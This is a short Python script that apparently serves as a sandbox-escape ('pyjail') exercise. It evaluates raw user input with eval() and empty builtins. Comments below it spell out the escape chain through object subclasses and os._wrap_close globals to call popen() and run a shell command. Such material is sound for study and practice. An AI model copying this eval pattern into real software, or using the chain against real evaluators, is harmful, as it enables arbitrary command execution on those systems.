#!/usr/bin/env python3

x = input()
print(eval(x, {'__builtins__': {}}))   

# clsss = "".__class__.__base__.__subclasses__()
# [(i, x) for i, x in enumerate(clsss) if "os" in x.__name__]
# [(i, elem) for i, elem in enumerate(clsss) if "printer" in getattr(elem, "__name__", "").lower()] // get all printer classes
# confirm the "os._wrap_close" by "".__class__.__base__.__subclasses__()[159]
# "".__class__.__base__.__subclasses__()[159].__init__.__globals__.keys() ---> get popen
# "".__class__.__base__.__subclasses__()[159].__init__.__globals__["popen"]("pwd").read()